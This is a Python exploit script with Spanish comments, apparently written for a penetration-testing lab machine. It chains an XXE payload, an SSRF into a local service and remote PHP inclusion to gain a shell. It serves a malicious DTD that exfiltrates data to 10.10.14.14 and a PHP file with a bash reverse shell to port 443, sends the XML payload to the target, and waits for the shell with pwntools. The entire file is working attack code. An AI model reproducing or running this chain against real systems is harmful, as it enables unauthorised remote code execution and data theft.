import http.server
import socketserver
import threading
import subprocess
import socket
import requests
from pwn import *


def def_handler(sig, frame):
    print("Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


# Función para manejar las solicitudes del servidor web
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/ssrf2.xml":
            # Respuesta para ssrf2.xml
            response = """<!ENTITY % file SYSTEM "http://127.0.0.1:4/index.php?page=http://10.10.14.14/index">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://10.10.14.14/%file;'>">
%eval;"""
            self.send_response(200)
            self.send_header("Content-type", "application/xml")
            self.end_headers()
            self.wfile.write(response.encode())

        elif self.path == "/index.php":
            # Respuesta para index
            response = """<?php
  system("bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'");
?>"""
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(response.encode())

        else:
            super().do_GET()

# Función para iniciar el servidor HTTP
def start_http_server():
    with socketserver.TCPServer(("10.10.14.14", 80), MyHandler) as httpd:
        print("Servidor HTTP en funcionamiento en 10.10.14.14:80")
        httpd.serve_forever()


def req():

    # Realizar la solicitud HTTP para activar la reverse shell
    burp0_url = "http://10.10.10.62:56423/"
    burp0_cookies = {"pmaCookieVer": "5", "pma_lang": "en", "pma_collation_connection": "utf8mb4_unicode_ci"}
    burp0_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "DNT": "1",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
    }
    burp0_data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE test [ <!ENTITY % xxe SYSTEM \"http://10.10.14.14/ssrf2.xml\"> %xxe; ]>\r\n<Heartbeat>\r\n\t<Ping>\r\n\t\t&exfil;\r\n\t</Ping>\r\n</Heartbeat>"

    print("Enviando solicitud a 10.10.10.62:56423...")
    response_ssrf = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

if __name__ == "__main__":
    # Iniciar el servidor HTTP en un subproceso
    try:
        http_server_thread = threading.Thread(target=start_http_server)
        http_server_thread.daemon = True
        http_server_thread.start()

        req = threading.Thread(target=req)
        req.daemon = True
        req.start()

        
    except Exception as e:
        log.error(str(e)) 

    lport = 443
    shell = listen(lport, timeout=20).wait_for_connection()
    

    if shell.sock is None:
        log.failure("No se pudo establecer conexion")
        sys.exit(1)
    else:
        shell.interactive()
